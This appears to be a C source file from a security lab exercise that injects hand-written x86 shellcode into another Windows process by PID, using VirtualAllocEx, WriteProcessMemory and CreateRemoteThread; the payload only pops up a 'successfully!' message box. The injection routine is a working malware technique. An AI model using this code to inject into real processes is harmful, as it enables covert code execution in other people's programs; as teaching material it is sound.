#include <windows.h>
#include<stdio.h>
#include<string.h>
//int i;
char code[]={ 0xeb,0x1d,
			  0xb8,0x00,0x00,0x00,0x00,//LoadLibraryA的地址
			  0xff,0xd0,
		      0xeb,0x24,
			  0x50,
			  0xb8,0x00,0x00,0x00,0x00,//GetProcAddress的地址
			  0xff,0xd0,
              0x6a,0x00,
		      0xeb,0x29,
			  0x5b,
			  0x53,
              0x53,
			  0x6a,0x00,
		      0xff,0xd0,
			  0xc3,
			  0xe8,0xde,0xff,0xff,0xff,//LoadLibraryA的参数
              'u','s','e','r','3','2','.','d','l','l',0x00,
			   0xe8,0xd7,0xff,0xff,0xff,//GetprocAddress的参数
              'M','e','s','s','a','g','e','B','o','x','A',0x00,
			   0xe8,0xd2,0xff,0xff,0xff,//MessageBoxAc参数的
			   "successfully!"
              };
int main(int argc, char *argv[])
{
    int pid = 0;
    int exitcode=0;
    int b=(int)LoadLibraryA;
    int c=(int)GetProcAddress;
    HANDLE hproc = 0;
    DWORD dwThreadId;
    PVOID pRemoteThread ;
    HANDLE  hThread	   = 0;
    int addr;
    char *s = "I'm hacked ";

    // YOU MAY NEED MORE LOCAL VARIABLES
    // PLEASE ADD THEM HERE
    int i;
    //hwllow.c中i的地址为004177E0
    if (argc < 2) {
        printf("Usage: %s pid\n", argv[0]);
        return -1;
    }
    pid = atoi(argv[1]);
    if (pid <= 0) {
        printf("[E]: pid must be positive (pid>0)!\n"); 
        return -2;
    }

    hproc = OpenProcess(PROCESS_CREATE_THREAD 
        | PROCESS_QUERY_INFORMATION
        | PROCESS_VM_OPERATION 
        | PROCESS_VM_WRITE 
        | PROCESS_VM_READ,
        FALSE, pid);

/**************************************************************************/
  code[3]= (b)     &255;
  code[4]= (b>>8)  &255;
  code[5]= (b>>16) &255;
  code[6]= (b>>24) &255;
  
  code[13]= (c)     &255;
  code[14]= (c>>8)  &255;
  code[15]= (c>>16) &255;
  code[16]= (c>>24) &255;
  
pRemoteThread = VirtualAllocEx(hproc, NULL, 0x52, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

WriteProcessMemory(hproc,pRemoteThread,code,0x52,0);

hThread=CreateRemoteThread(hproc,0,0,pRemoteThread,pRemoteThread,0,&dwThreadId);

WaitForSingleObject(hThread, INFINITE);

GetExitCodeThread(hThread, (PDWORD) &exitcode);

VirtualFreeEx(hproc, pRemoteThread, 0, MEM_RELEASE);
/*********************************************************************************/
    if (!CloseHandle(hproc)) {
        printf("[E]: Process (%d) cannot be closed !\n", pid);
        return 2;
    };
    printf("[I]: Process (%d) is closed. \n", pid);
    return 0;
}